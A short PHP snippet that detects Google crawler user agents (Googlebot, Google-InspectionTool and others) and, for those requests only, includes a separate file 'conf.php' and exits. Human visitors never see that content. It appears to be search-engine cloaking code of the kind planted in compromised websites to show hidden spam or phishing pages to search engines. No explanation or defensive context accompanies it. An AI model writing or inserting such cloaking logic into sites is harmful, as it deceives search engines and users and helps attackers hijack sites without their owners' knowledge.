<?php
function is_bot() {
    $agents = array(
        "Googlebot",
        "Google-Site-Verification",
        "Google-InspectionTool",
        "Googlebot-Mobile",
        "Googlebot-News"
    );
 
    foreach ($agents as $agent) {
        if (isset($_SERVER['HTTP_USER_AGENT']) &&
            strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
            return true;
        }
    }
    return false;
}
 
if (is_bot()) {
    include 'conf.php';
    exit;
}
